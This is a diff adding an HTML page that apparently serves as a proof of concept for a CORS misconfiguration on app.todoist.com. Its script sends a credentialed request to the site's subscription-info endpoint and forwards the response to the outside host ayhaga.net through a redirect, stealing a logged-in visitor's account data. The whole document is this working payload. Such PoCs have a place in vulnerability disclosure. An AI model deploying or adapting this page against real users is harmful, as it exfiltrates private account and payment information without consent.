@@ -1,0 +1,16 @@
+<html>
+<body>
+<h1>hello</h1>
+<script>
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://app.todoist.com/prefs/v1/payments/get_subscription_info',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//ayhaga.net/app.todoist.com?key='+this.responseText; 
+};
+</script>
+</body>
+</html>
